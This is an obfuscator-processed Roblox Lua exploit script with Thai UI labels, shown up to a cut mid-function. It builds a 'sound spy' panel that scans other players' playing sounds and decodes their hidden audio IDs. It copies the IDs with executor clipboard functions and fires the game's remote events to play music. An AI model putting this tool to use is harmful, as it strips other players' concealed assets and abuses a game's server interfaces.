--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.10.9) ~  Much Love, Ferib 

]]--

local Players = game:GetService("Players");
local UserInputService = game:GetService("UserInputService");
local HttpService = game:GetService("HttpService");
local ReplicatedStorage = game:GetService("ReplicatedStorage");
local MarketplaceService = game:GetService("MarketplaceService");
local TextService = game:GetService("TextService");
local TextChatService = game:GetService("TextChatService");
local TweenService = game:GetService("TweenService");
local LocalPlayer = Players.LocalPlayer;
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui");
local AdminUsername = "kfc_punyai";
local IsAdmin = LocalPlayer.Name:lower() == AdminUsername:lower();
local BannedFromScript = {};
local CurrentSelectedPlayer = nil;
local StatusLabel = nil;
local AssetCache = {};
local BlockedIDs = {["00106800577264015"]=true,["00109462618039650"]=true,["00112583972042063"]=true,["00113841533670628"]=true,["00116872955970254"]=true,["00117424747387525"]=true,["00117628371363749"]=true,["00121320825772761"]=true,["00125329595131078"]=true,["00129043827992035"]=true,["00134076916421685"]=true,["00134523838494464"]=true,["00137058099826867"]=true,["00138763959207625"]=true,["0070567654933546"]=true,["0079688020178596"]=true,["0083260119948695"]=true,["0083681471562121"]=true,["0083848201981900"]=true,["0090308298517537"]=true,["0093338918256962"]=true,["0093932829347443"]=true,["00"]=true,["4"]=true,["62"]=true,["7"]=true,["78899"]=true,["83260119948695"]=true,["9"]=true,["00120104871360327"]=true,["00129060362076134"]=true,["101631982347841"]=true,["112210298860778"]=true,["115819698454027"]=true,["116331922770563"]=true,["117391349741339"]=true,["117871196330268"]=true,["120313493879944"]=true,["134216333534795"]=true,["137555839480738"]=true,["140497415402103"]=true,["54410081542"]=true,["70999314371231"]=true,["71352236"]=true,["76500780055460"]=true,["78515442941510"]=true,["90533928572341"]=true,["99721399503975"]=true,["00101020203030404"]=true,["00112233445566778"]=true,["00123456789012345"]=true,["00135791357913579"]=true,["00159260374815926"]=true,["00246802468024680"]=true,["00405060708090001"]=true,["00543210987654321"]=true,["00731959731959731"]=true,["00864208642086420"]=true,["00887766554433221"]=true,["00975319753197531"]=true,["00987654321098765"]=true,["00998877665544332"]=true,["129569049476734"]=true,["81067084464165"]=true,["00159837264918375"]=true,["115897193508594"]=true,["123728962822472"]=true,["0106800577264015"]=true,["0090308298517537"]=true,["0082763296909782"]=true,["001487259163048"]=true,["00984317620519"]=true,["001320598471652"]=true,["007659184302781"]=true,["00971542086317"]=true,["001563908247615"]=true,["00821475390648"]=true,["001145739628405"]=true,["007482051963147"]=true,["00938627541052"]=true,["008719452861439"]=true,["00153682974105"]=true,["009417285603187"]=true,["0072849156380"]=true,["001865942713084"]=true,["0092541768309"]=true,["001174926580315"]=true,["0084617295306"]=true,["001938571462098"]=true,["0056714928306"]=true,["001692847513894"]=true,["0085142976031"]=true,["009741638259047"]=true,["0024819573608"]=true,["001780564921835"]=true,["00659274185609"]=true,["00841679520841"]=true,["001295841760392"]=true,["00571486925071"]=true,["001985271640958"]=true,["0014796528174059"]=true,["0087415926804"]=true,["001927845160984"]=true,["0052641879502"]=true,["001895714628051"]=true,["0095168427095"]=true,["002174958613047"]=true,["0086294751806"]=true,["001358074926185"]=true,["0098461752908"]=true,["106800577264015"]=true,["90308298517537"]=true,["82763296909782"]=true,["1487259163048"]=true,["984317620519"]=true,["1320598471652"]=true,["7659184302781"]=true,["971542086317"]=true,["1563908247615"]=true,["821475390648"]=true,["1145739628405"]=true,["7482051963147"]=true,["938627541052"]=true,["8719452861439"]=true,["153682974105"]=true,["9417285603187"]=true,["72849156380"]=true,["1865942713084"]=true,["92541768309"]=true,["1174926580315"]=true,["84617295306"]=true,["1938571462098"]=true,["56714928306"]=true,["1692847513894"]=true,["85142976031"]=true,["9741638259047"]=true,["24819573608"]=true,["1780564921835"]=true,["659274185609"]=true,["841679520841"]=true,["1295841760392"]=true,["571486925071"]=true,["1985271640958"]=true,["14796528174059"]=true,["87415926804"]=true,["1927845160984"]=true,["52641879502"]=true,["1895714628051"]=true,["95168427095"]=true,["2174958613047"]=true,["86294751806"]=true,["1358074926185"]=true,["98461752908"]=true,["520268273928362"]=true,["726381937273927"]=true,["828283747362837"]=true,["822873728182728"]=true,["916392946194817"]=true,["323466748315842"]=true,["277364728273297"]=true,["188273627276327"]=true,["362783746382823"]=true,["717263536173739"]=true,["71726353617373"]=true,["235408273918271"]=true,["5678904826695139"]=true,["0123415962284074"]=true,["4027895317706428"]=true,["1956362703348153"]=true,["2834037149950260"]=true,["33786926931174059"]=true,["7402180465529731"]=true,["6319548620017395"]=true,["8135709247763587"]=true,["9240651784430966"]=true,["24213056027674"]=true,["543334512086734"]=true,["262185420860413"]=true};
local function urlDecode(str)
	local FlatIdent_6147E = 0;
	while true do
		if (FlatIdent_6147E == 0) then
			if not str then
				return "";
			end
			str = string.gsub(str, "+", " ");
			FlatIdent_6147E = 1;
		end
		if (FlatIdent_6147E == 1) then
			return (string.gsub(str, "%%(%x%x)", function(h)
				return string.char(tonumber(h, 16));
			end));
		end
	end
end
local function hexDecode(str)
	local FlatIdent_95CAC = 0;
	while true do
		if (FlatIdent_95CAC == 2) then
			str = string.gsub(str, "%s+", "");
			if (string.match(str, "^%x+$") and ((#str % 2) == 0)) then
				local FlatIdent_2953F = 0;
				local decoded;
				while true do
					if (FlatIdent_2953F == 0) then
						decoded = "";
						for i = 1, #str, 2 do
							local FlatIdent_47A9C = 0;
							local byteStr;
							local byte;
							while true do
								if (FlatIdent_47A9C == 1) then
									if byte then
										decoded = decoded .. string.char(byte);
									end
									break;
								end
								if (FlatIdent_47A9C == 0) then
									byteStr = string.sub(str, i, i + 1);
									byte = tonumber(byteStr, 16);
									FlatIdent_47A9C = 1;
								end
							end
						end
						FlatIdent_2953F = 1;
					end
					if (FlatIdent_2953F == 1) then
						if (#decoded > 0) then
							return decoded;
						end
						break;
					end
				end
			end
			FlatIdent_95CAC = 3;
		end
		if (FlatIdent_95CAC == 0) then
			if not str then
				return "";
			end
			str = string.gsub(str, "0x", "");
			FlatIdent_95CAC = 1;
		end
		if (FlatIdent_95CAC == 3) then
			return str;
		end
		if (FlatIdent_95CAC == 1) then
			str = string.gsub(str, "\\x", "");
			str = string.gsub(str, "%%", "");
			FlatIdent_95CAC = 2;
		end
	end
end
local function deepDecode(str)
	local FlatIdent_23BE8 = 0;
	local prev;
	while true do
		if (1 == FlatIdent_23BE8) then
			repeat
				local FlatIdent_31A5A = 0;
				while true do
					if (FlatIdent_31A5A == 1) then
						str = hexDecode(str);
						break;
					end
					if (FlatIdent_31A5A == 0) then
						prev = str;
						str = urlDecode(str);
						FlatIdent_31A5A = 1;
					end
				end
			until str == prev 
			return str;
		end
		if (FlatIdent_23BE8 == 0) then
			if (type(str) ~= "string") then
				return str;
			end
			prev = nil;
			FlatIdent_23BE8 = 1;
		end
	end
end
local function extractIDsFromPattern(text)
	local ids = {};
	local patterns = {"69%%64=([^&]*)","&id=([^&]*)","id=([^&]*)","audio=([^&]*)","song=([^&]*)","music=([^&]*)","%%69%%64=([^&]*)","&%%69%%64=([^&]*)","9%s*d%s*=%s*([^&]*)","9d=([^&]*)"};
	for _, pat in ipairs(patterns) do
		for capture in string.gmatch(text, pat) do
			for num in string.gmatch(capture, "%d+") do
				if not BlockedIDs[num] then
					table.insert(ids, num);
				end
			end
		end
	end
	return ids;
end
local function getPlayerVehicle(player)
	local FlatIdent_31905 = 0;
	local character;
	local humanoid;
	local seatPart;
	local vehicle;
	while true do
		if (FlatIdent_31905 == 2) then
			while vehicle and not vehicle:IsA("Model") do
				vehicle = vehicle.Parent;
			end
			if (vehicle and vehicle:IsA("Model")) then
				return vehicle;
			end
			return nil;
		end
		if (1 == FlatIdent_31905) then
			if not humanoid then
				return nil;
			end
			seatPart = humanoid.SeatPart;
			if not seatPart then
				return nil;
			end
			vehicle = seatPart.Parent;
			FlatIdent_31905 = 2;
		end
		if (0 == FlatIdent_31905) then
			if not player then
				return nil;
			end
			character = player.Character;
			if not character then
				return nil;
			end
			humanoid = character:FindFirstChildOfClass("Humanoid");
			FlatIdent_31905 = 1;
		end
	end
end
local function checkPlayerAllSounds(targetPlayer)
	local FlatIdent_E652 = 0;
	local scanTargets;
	local backpack;
	local vehicle;
	local validSounds;
	local soundMap;
	local NameBlacklist;
	while true do
		if (FlatIdent_E652 == 1) then
			if backpack then
				table.insert(scanTargets, backpack);
			end
			vehicle = getPlayerVehicle(targetPlayer);
			if vehicle then
				table.insert(scanTargets, vehicle);
			end
			validSounds = {};
			FlatIdent_E652 = 2;
		end
		if (0 == FlatIdent_E652) then
			if not targetPlayer then
				return {};
			end
			scanTargets = {};
			if targetPlayer.Character then
				table.insert(scanTargets, targetPlayer.Character);
			end
			backpack = targetPlayer:FindFirstChild("Backpack");
			FlatIdent_E652 = 1;
		end
		if (FlatIdent_E652 == 2) then
			soundMap = {};
			NameBlacklist = {gettingup=true,died=true,freefalling=true,jumping=true,landing=true,running=true,splash=true,swimming=true,climbing=true,skateboard=true,skate=true,board=true,car=true,vehicle=true,bike=true,scooter=true,bicycle=true,motorcycle=true,engine=true,motor=true,horn=true,tire=true,wheel=true,brake=true,squeak=true,driving=true,road=true,crash=true,impact=true,bump=true};
			for _, folder in ipairs(scanTargets) do
				local FlatIdent_8F59B = 0;
				local success;
				local descendants;
				while true do
					if (FlatIdent_8F59B == 0) then
						success, descendants = pcall(function()
							return folder:GetDescendants();
						end);
						if (success and descendants) then
							for _, obj in ipairs(descendants) do
								if (obj:IsA("Sound") and (obj.SoundId ~= "") and obj.IsPlaying) then
									local FlatIdent_B322 = 0;
									local soundNameLower;
									local isBlacklisted;
									while true do
										if (FlatIdent_B322 == 0) then
											soundNameLower = string.lower(obj.Name);
											isBlacklisted = false;
											FlatIdent_B322 = 1;
										end
										if (1 == FlatIdent_B322) then
											for blockedName, _ in pairs(NameBlacklist) do
												if string.find(soundNameLower, blockedName) then
													isBlacklisted = true;
													break;
												end
											end
											if not isBlacklisted then
												local FlatIdent_9147D = 0;
												local key;
												while true do
													if (FlatIdent_9147D == 0) then
														key = obj.SoundId;
														if not soundMap[key] then
															local FlatIdent_6A83E = 0;
															while true do
																if (FlatIdent_6A83E == 0) then
																	soundMap[key] = true;
																	table.insert(validSounds, obj);
																	break;
																end
															end
														end
														break;
													end
												end
											end
											break;
										end
									end
								end
							end
						end
						break;
					end
				end
			end
			return validSounds;
		end
	end
end
local function copyToClipboard(text)
	local FlatIdent_2D2B8 = 0;
	local setclip;
	while true do
		if (FlatIdent_2D2B8 == 0) then
			setclip = setclipboard or toclipboard or (Clipboard and Clipboard.set);
			if setclip then
				setclip(text);
			end
			break;
		end
	end
end
local function playMusicFromId(musicId)
	local FlatIdent_E0D0 = 0;
	local re;
	while true do
		if (FlatIdent_E0D0 == 0) then
			if (not musicId or (musicId == "")) then
				return false;
			end
			re = ReplicatedStorage:FindFirstChild("RE");
			FlatIdent_E0D0 = 1;
		end
		if (FlatIdent_E0D0 == 1) then
			if re then
				local FlatIdent_1CFC3 = 0;
				local success1;
				local success2;
				local event1;
				local event2;
				while true do
					if (FlatIdent_1CFC3 == 2) then
						if event2 then
							local args2 = {"ToolMusicText",musicId,"",[4]=true};
							success2 = pcall(function()
								event2:FireServer(unpack(args2));
							end);
						end
						return success1 or success2;
					end
					if (FlatIdent_1CFC3 == 0) then
						success1, success2 = false, false;
						event1 = re:FindFirstChild("PlayerToolEvent");
						FlatIdent_1CFC3 = 1;
					end
					if (FlatIdent_1CFC3 == 1) then
						if event1 then
							local FlatIdent_3EEE1 = 0;
							local args1;
							while true do
								if (FlatIdent_3EEE1 == 0) then
									args1 = {"ToolMusicText",musicId,"",[4]=true};
									success1 = pcall(function()
										event1:FireServer(unpack(args1));
									end);
									break;
								end
							end
						end
						event2 = re:FindFirstChild("1NoMoto1rVehicle1s");
						FlatIdent_1CFC3 = 2;
					end
				end
			end
			return false;
		end
	end
end
local function findTargetPlayer(str)
	if (not str or (str == "")) then
		return nil;
	end
	str = str:lower();
	for _, p in ipairs(Players:GetPlayers()) do
		if ((p.Name:lower():sub(1, #str) == str) or (p.DisplayName:lower():sub(1, #str) == str)) then
			return p;
		end
	end
	return nil;
end
if PlayerGui:FindFirstChild("Honkuki_DeepSoundSpy") then
	PlayerGui.Honkuki_DeepSoundSpy:Destroy();
end
local ScreenGui = Instance.new("ScreenGui", PlayerGui);
ScreenGui.Name = "Honkuki_DeepSoundSpy";
ScreenGui.ResetOnSpawn = false;
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling;
local function setDrag(frame, handle)
	local FlatIdent_39764 = 0;
	local dragging;
	local dragInput;
	local dragStart;
	local startPos;
	while true do
		if (FlatIdent_39764 == 0) then
			dragging, dragInput, dragStart, startPos = nil;
			handle.InputBegan:Connect(function(input)
				if ((input.UserInputType == Enum.UserInputType.MouseButton1) or (input.UserInputType == Enum.UserInputType.Touch)) then
					local FlatIdent_87441 = 0;
					while true do
						if (FlatIdent_87441 == 1) then
							startPos = frame.Position;
							input.Changed:Connect(function()
								if (input.UserInputState == Enum.UserInputState.End) then
									dragging = false;
								end
							end);
							break;
						end
						if (FlatIdent_87441 == 0) then
							dragging = true;
							dragStart = input.Position;
							FlatIdent_87441 = 1;
						end
					end
				end
			end);
			FlatIdent_39764 = 1;
		end
		if (FlatIdent_39764 == 1) then
			handle.InputChanged:Connect(function(input)
				if ((input.UserInputType == Enum.UserInputType.MouseMovement) or (input.UserInputType == Enum.UserInputType.Touch)) then
					dragInput = input;
				end
			end);
			UserInputService.InputChanged:Connect(function(input)
				if ((input == dragInput) and dragging) then
					local FlatIdent_4D907 = 0;
					local delta;
					while true do
						if (FlatIdent_4D907 == 0) then
							delta = input.Position - dragStart;
							frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y);
							break;
						end
					end
				end
			end);
			break;
		end
	end
end
local MainFrame = Instance.new("Frame", ScreenGui);
MainFrame.Size = UDim2.new(0, 520, 0, 240);
MainFrame.Position = UDim2.new(0.5, -260, 0.5, -120);
MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20);
MainFrame.ZIndex = 1;
Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 8);
local mStroke = Instance.new("UIStroke", MainFrame);
mStroke.Color = Color3.fromRGB(60, 60, 60);
local TopBar = Instance.new("Frame", MainFrame);
TopBar.Size = UDim2.new(1, 0, 0, 32);
TopBar.BackgroundColor3 = Color3.fromRGB(30, 30, 30);
Instance.new("UICorner", TopBar).CornerRadius = UDim.new(0, 8);
setDrag(MainFrame, TopBar);
local Title = Instance.new("TextLabel", TopBar);
Title.Size = UDim2.new(1, -10, 1, 0);
Title.Position = UDim2.new(0, 12, 0, 0);
Title.BackgroundTransparency = 1;
Title.Text = "HONKUKI DEEP VALIDATOR SCANNER (HORIZONTAL-LIGHT)";
Title.TextColor3 = Color3.fromRGB(255, 215, 0);
Title.Font = Enum.Font.GothamBold;
Title.TextSize = 11;
Title.TextXAlignment = Enum.TextXAlignment.Left;
local ListScroll = Instance.new("ScrollingFrame", MainFrame);
ListScroll.Size = UDim2.new(0.45, 0, 0, 155);
ListScroll.Position = UDim2.new(0.03, 0, 0.18, 0);
ListScroll.BackgroundColor3 = Color3.fromRGB(15, 15, 15);
ListScroll.BorderSizePixel = 0;
ListScroll.ScrollBarThickness = 4;
ListScroll.ScrollBarImageColor3 = Color3.fromRGB(255, 215, 0);
Instance.new("UICorner", ListScroll).CornerRadius = UDim.new(0, 5);
local Layout = Instance.new("UIListLayout", ListScroll);
Layout.Padding = UDim.new(0, 4);
local ButtonsContainer = Instance.new("Frame", MainFrame);
ButtonsContainer.Size = UDim2.new(0.47, 0, 0, 155);
ButtonsContainer.Position = UDim2.new(0.5, 0, 0.18, 0);
ButtonsContainer.BackgroundTransparency = 1;
local BLayout = Instance.new("UIListLayout", ButtonsContainer);
BLayout.Padding = UDim.new(0, 3);
local GetIDBtn = Instance.new("TextButton", ButtonsContainer);
GetIDBtn.Size = UDim2.new(1, 0, 0, 22);
GetIDBtn.BackgroundColor3 = Color3.fromRGB(255, 215, 0);
GetIDBtn.Text = "⚡ เจาะและดึงไอดีทั้งหมดทันที";
GetIDBtn.Font = Enum.Font.GothamBold;
GetIDBtn.TextSize = 10;
GetIDBtn.TextColor3 = Color3.fromRGB(20, 20, 20);
Instance.new("UICorner", GetIDBtn).CornerRadius = UDim.new(0, 4);
local GetJunkBtn = Instance.new("TextButton", ButtonsContainer);
GetJunkBtn.Size = UDim2.new(1, 0, 0, 22);
GetJunkBtn.BackgroundColor3 = Color3.fromRGB(230, 90, 40);
GetJunkBtn.Text = "🎵 เปิดเพลงตามขยะอย่างเดียว";
GetJunkBtn.Font = Enum.Font.GothamBold;
GetJunkBtn.TextSize = 10;
GetJunkBtn.TextColor3 = Color3.fromRGB(255, 255, 255);
Instance.new("UICorner", GetJunkBtn).CornerRadius = UDim.new(0, 4);
local ViewRawJunkBtn = Instance.new("TextButton", ButtonsContainer);
ViewRawJunkBtn.Size = UDim2.new(1, 0, 0, 22);
ViewRawJunkBtn.BackgroundColor3 = Color3.fromRGB(140, 20, 230);
ViewRawJunkBtn.Text = "👁️ ดูข้อความ RAW ดิบของผู้เล่น";
ViewRawJunkBtn.Font = Enum.Font.GothamBold;
ViewRawJunkBtn.TextSize = 10;
ViewRawJunkBtn.TextColor3 = Color3.fromRGB(255, 255, 255);
Instance.new("UICorner", ViewRawJunkBtn).CornerRadius = UDim.new(0, 4);
local ViewInstantBtn = Instance.new("TextButton", ButtonsContainer);
ViewInstantBtn.Size = UDim2.new(1, 0, 0, 22);
ViewInstantBtn.BackgroundColor3 = Color3.fromRGB(0, 200, 100);
ViewInstantBtn.Text = "🔍 ดู ID เจาะทั้งหมด (Real-time)";
ViewInstantBtn.Font = Enum.Font.GothamBold;
ViewInstantBtn.TextSize = 10;
ViewInstantBtn.TextColor3 = Color3.fromRGB(255, 255, 255);
Instance.new("UICorner", ViewInstantBtn).CornerRadius = UDim.new(0, 4);
local AdminCmdBtn = nil;
if IsAdmin then
	AdminCmdBtn = Instance.new("TextButton", ButtonsContainer);
	AdminCmdBtn.Size = UDim2.new(1, 0, 0, 22);
	AdminCmdBtn.BackgroundColor3 = Color3.fromRGB(180, 0, 255);
	AdminCmdBtn.Text = "👑 ADMIN COMMANDS (ดูคำสั่งคำแชท)";
	AdminCmdBtn.Font = Enum.Font.GothamBold;
	AdminCmdBtn.TextSize = 10;
	AdminCmdBtn.TextColor3 = Color3.fromRGB(255, 215, 0);
	Instance.new("UICorner", AdminCmdBtn).CornerRadius = UDim.new(0, 4);
	local aStroke = Instance.new("UIStroke", AdminCmdBtn);
	aStroke.Color = Color3.fromRGB(255, 215, 0);
	aStroke.Thickness = 1;
end
StatusLabel = Instance.new("TextLabel", MainFrame);
StatusLabel.Size = UDim2.new(0.68, 0, 0, 24);
StatusLabel.Position = UDim2.new(0.03, 0, 0.86, 0);
StatusLabel.BackgroundColor3 = Color3.fromRGB(255, 215, 0);
StatusLabel.BackgroundTransparency = 0.9;
StatusLabel.Text = "ระบบพร้อมเจาะข้อมูลผู้เล่น...";
StatusLabel.TextColor3 = Color3.fromRGB(255, 215, 0);
StatusLabel.Font = Enum.Font.Gotham;
StatusLabel.TextSize = 10;
StatusLabel.TextWrapped = true;
Instance.new("UICorner", StatusLabel).CornerRadius = UDim.new(0, 4);
local RefreshBtn = Instance.new("TextButton", MainFrame);
RefreshBtn.Size = UDim2.new(0.24, 0, 0, 24);
RefreshBtn.Position = UDim2.new(0.73, 0, 0.86, 0);
RefreshBtn.BackgroundColor3 = Color3.fromRGB(45, 45, 45);
RefreshBtn.Text = "🔄 รีเฟรชรายชื่อ";
RefreshBtn.Font = Enum.Font.GothamBold;
RefreshBtn.TextSize = 10;
RefreshBtn.TextColor3 = Color3.fromRGB(255, 255, 255);
Instance.new("UICorner", RefreshBtn).CornerRadius = UDim.new(0, 4);
local ToggleBtn = Instance.new("TextButton", ScreenGui);
ToggleBtn.Size = UDim2.new(0, 46, 0, 46);
ToggleBtn.Position = UDim2.new(0.02, 0, 0.4, 0);
ToggleBtn.BackgroundColor3 = Color3.fromRGB(10, 10, 10);
ToggleBtn.Text = "🎵";
ToggleBtn.TextSize = 18;
ToggleBtn.TextColor3 = Color3.fromRGB(255, 215, 0);
ToggleBtn.ZIndex = 10;
Instance.new("UICorner", ToggleBtn).CornerRadius = UDim.new(0, 23);
local tStroke = Instance.new("UIStroke", ToggleBtn);
tStroke.Color = Color3.fromRGB(255, 215, 0);
tStroke.Thickness = 1.5;
setDrag(ToggleBtn, ToggleBtn);
local JunkFrame = Instance.new("Frame", ScreenGui);
JunkFrame.Size = UDim2.new(0, 420, 0, 240);
JunkFrame.Position = UDim2.new(0.5, -210, 0.5, -120);
JunkFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25);
JunkFrame.Visible = false;
JunkFrame.ZIndex = 5;
Instance.new("UICorner", JunkFrame).CornerRadius = UDim.new(0, 8);
local jStroke = Instance.new("UIStroke", JunkFrame);
jStroke.Color = Color3.fromRGB(140, 20, 230);
jStroke.Thickness = 1.5;
local JunkTopBar = Instance.new("Frame", JunkFrame);
JunkTopBar.Size = UDim2.new(1, 0, 0, 32);
JunkTopBar.BackgroundColor3 = Color3.fromRGB(35, 35, 35);
Instance.new("UICorner", JunkTopBar).CornerRadius = UDim.new(0, 8);
setDrag(JunkFrame, JunkTopBar);
local JunkTitle = Instance.new("TextLabel", JunkTopBar);
JunkTitle.Size = UDim2.new(1, -10, 1, 0);
JunkTitle.Position = UDim2.new(0, 12, 0, 0);
JunkTitle.BackgroundTransparency = 1;
JunkTitle.Text = "VIEWER WINDOW";
JunkTitle.TextColor3 = Color3.fromRGB(200, 100, 255);
JunkTitle.Font = Enum.Font.GothamBold;
JunkTitle.TextSize = 11;
JunkTitle.TextXAlignment = Enum.TextXAlignment.Left;
local JunkScroll = Instance.new("ScrollingFrame", JunkFrame);
JunkScroll.Size = UDim2.new(0.94, 0, 0, 150);
JunkScroll.Position = UDim2.new(0.03, 0, 0.18, 0);
JunkScroll.BackgroundColor3 = Color3.fromRGB(12, 12, 12);
JunkScroll.BorderSizePixel = 0;
JunkScroll.ScrollBarThickness = 4;
JunkScroll.ScrollBarImageColor3 = Color3.fromRGB(140, 20, 230);
Instance.new("UICorner", JunkScroll).CornerRadius = UDim.new(0, 5);
local JunkTextLabel = Instance.new("TextLabel", JunkScroll);
JunkTextLabel.Size = UDim2.new(1, -10, 0, 0);
JunkTextLabel.Position = UDim2.new(0, 5, 0, 5);
JunkTextLabel.BackgroundTransparency = 1;
JunkTextLabel.Text = "ไม่มีข้อมูล...";
JunkTextLabel.TextColor3 = Color3.fromRGB(220, 220, 220);
JunkTextLabel.Font = Enum.Font.Code;
JunkTextLabel.TextSize = 11;
JunkTextLabel.TextXAlignment = Enum.TextXAlignment.Left;
JunkTextLabel.TextYAlignment = Enum.TextYAlignment.Top;
JunkTextLabel.TextWrapped = true;
local JunkCopyBtn = Instance.new("TextButton", JunkFrame);
JunkCopyBtn.Size = UDim2.new(0.45, 0, 0, 26);
JunkCopyBtn.Position = UDim2.new(0.03, 0, 0.86, 0);
JunkCopyBtn.BackgroundColor3 = Color3.fromRGB(140, 20, 230);
JunkCopyBtn.Text = "📋 คัดลอกทั้งหมด";
JunkCopyBtn.Font = Enum.Font.GothamBold;
JunkCopyBtn.TextSize = 11;
JunkCopyBtn.TextColor3 = Color3.fromRGB(255, 255, 255);
Instance.new("UICorner", JunkCopyBtn).CornerRadius = UDim.new(0, 5);
local JunkBackBtn = Instance.new("TextButton", JunkFrame);
JunkBackBtn.Size = UDim2.new(0.45, 0, 0, 26);
JunkBackBtn.Position = UDim2.new(0.52, 0, 0.86, 0);
JunkBackBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 50);
JunkBackBtn.Text = "⬅️ ย้อนกลับ";
JunkBackBtn.Font = Enum.Font.GothamBold;
JunkBackBtn.TextSize = 11;
JunkBackBtn.TextColor3 = Color3.fromRGB(255, 255, 255);
Instance.new("UICorner", JunkBackBtn).CornerRadius = UDim.new(0, 5);
local CurrentViewMode = 1;
local PlayerButtons = {};
local function refreshPlayers()
	if (not ListScroll or not ListScroll:IsDescendantOf(game)) then
		return;
	end
	local currentPlayers = Players:GetPlayers();
	local activeMap = {};
	for _, p in ipairs(currentPlayers) do
		if (p ~= LocalPlayer) then
			activeMap[p] = true;
			local btn = PlayerButtons[p];
			if not btn then
				local FlatIdent_73F66 = 0;
				local bStroke;
				while true do
					if (FlatIdent_73F66 == 3) then
						bStroke = Instance.new("UIStroke", btn);
						bStroke.Color = Color3.fromRGB(40, 40, 40);
						FlatIdent_73F66 = 4;
					end
					if (FlatIdent_73F66 == 0) then
						btn = Instance.new("TextButton", ListScroll);
						btn.Size = UDim2.new(1, -6, 0, 28);
						FlatIdent_73F66 = 1;
					end
					if (FlatIdent_73F66 == 1) then
						btn.Font = Enum.Font.Gotham;
						btn.TextSize = 11;
						FlatIdent_73F66 = 2;
					end
					if (FlatIdent_73F66 == 4) then
						btn.MouseButton1Click:Connect(function()
							local FlatIdent_189F0 = 0;
							while true do
								if (FlatIdent_189F0 == 0) then
									for playerObj, b in pairs(PlayerButtons) do
										if b:FindFirstChildOfClass("UIStroke") then
											b.UIStroke.Color = Color3.fromRGB(40, 40, 40);
										end
									end
									bStroke.Color = Color3.fromRGB(255, 215, 0);
									FlatIdent_189F0 = 1;
								end
								if (FlatIdent_189F0 == 1) then
									CurrentSelectedPlayer = p;
									StatusLabel.Text = "เลือก: " .. p.DisplayName;
									FlatIdent_189F0 = 2;
								end
								if (FlatIdent_189F0 == 2) then
									updateJunkViewerLive();
									break;
								end
							end
						end);
						PlayerButtons[p] = btn;
						break;
					end
					if (FlatIdent_73F66 == 2) then
						btn.TextXAlignment = Enum.TextXAlignment.Left;
						Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 4);
						FlatIdent_73F66 = 3;
					end
				end
			end
			local activeSounds = checkPlayerAllSounds(p);
			if (#activeSounds > 0) then
				local FlatIdent_207CC = 0;
				while true do
					if (FlatIdent_207CC == 0) then
						btn.Text = " 🎵 " .. p.DisplayName .. " (@" .. p.Name .. ")";
						btn.TextColor3 = Color3.fromRGB(0, 255, 0);
						break;
					end
				end
			else
				local FlatIdent_6DC53 = 0;
				while true do
					if (0 == FlatIdent_6DC53) then
						btn.Text = " 👤 " .. p.DisplayName .. " (@" .. p.Name .. ")";
						btn.TextColor3 = Color3.fromRGB(230, 230, 230);
						break;
					end
				end
			end
			if (CurrentSelectedPlayer == p) then
				btn.UIStroke.Color = Color3.fromRGB(255, 215, 0);
			end
		end
	end
	for p, btn in pairs(PlayerButtons) do
		if not activeMap[p] then
			local FlatIdent_61EE = 0;
			while true do
				if (0 == FlatIdent_61EE) then
					btn:Destroy();
					PlayerButtons[p] = nil;
					break;
				end
			end
		end
	end
	ListScroll.CanvasSize = UDim2.new(0, 0, 0, Layout.AbsoluteContentSize.Y);
end
function updateJunkViewerLive()
	local FlatIdent_89237 = 0;
	local outputText;
	while true do
		if (FlatIdent_89237 == 0) then
			if not JunkFrame.Visible then
				return;
			end
			outputText = "";
			FlatIdent_89237 = 1;
		end
		if (FlatIdent_89237 == 1) then
			if (CurrentSelectedPlayer and (CurrentViewMode ~= 3)) then
				local targetPlayer = Players:FindFirstChild(CurrentSelectedPlayer.Name);
				if not targetPlayer then
					return;
				end
				local soundObjects = checkPlayerAllSounds(targetPlayer);
				if (CurrentViewMode == 1) then
					local FlatIdent_85FF9 = 0;
					while true do
						if (FlatIdent_85FF9 == 0) then
							JunkTitle.Text = "RAW JUNK VIEWER (ขยะดิบทั้งหมด 100%)";
							jStroke.Color = Color3.fromRGB(140, 20, 230);
							FlatIdent_85FF9 = 1;
						end
						if (FlatIdent_85FF9 == 1) then
							JunkCopyBtn.BackgroundColor3 = Color3.fromRGB(140, 20, 230);
							if (#soundObjects == 0) then
								outputText = "❌ ไม่พบออบเจกต์เสียงบนตัวผู้เล่นนี้";
							else
								for i, obj in ipairs(soundObjects) do
									outputText = outputText .. string.format("[%d] ออบเจกต์: %s\nID ดั้งเดิม: %s\n\n", i, obj:GetFullName(), obj.SoundId);
								end
							end
							break;
						end
					end
				elseif (CurrentViewMode == 2) then
					local FlatIdent_5B2CE = 0;
					while true do
						if (FlatIdent_5B2CE == 1) then
							JunkCopyBtn.BackgroundColor3 = Color3.fromRGB(0, 200, 100);
							if (#soundObjects == 0) then
								outputText = "❌ ไม่พบค่าตัวแปรเพลงของผู้เล่นนี้";
							else
								local FlatIdent_82AB4 = 0;
								local finalIds;
								local seenIds;
								while true do
									if (FlatIdent_82AB4 == 1) then
										for _, soundObj in ipairs(soundObjects) do
											local rawId = soundObj.SoundId or "";
											local decoded = deepDecode(rawId);
											local searchText = ((decoded ~= "") and decoded) or rawId;
											local extractedIds = extractIDsFromPattern(searchText);
											if (#extractedIds == 0) then
												for num in string.gmatch(searchText, "%d+") do
													if not BlockedIDs[num] then
														table.insert(extractedIds, num);
													end
												end
											end
											for _, id in ipairs(extractedIds) do
												if not seenIds[id] then
													local FlatIdent_2388 = 0;
													while true do
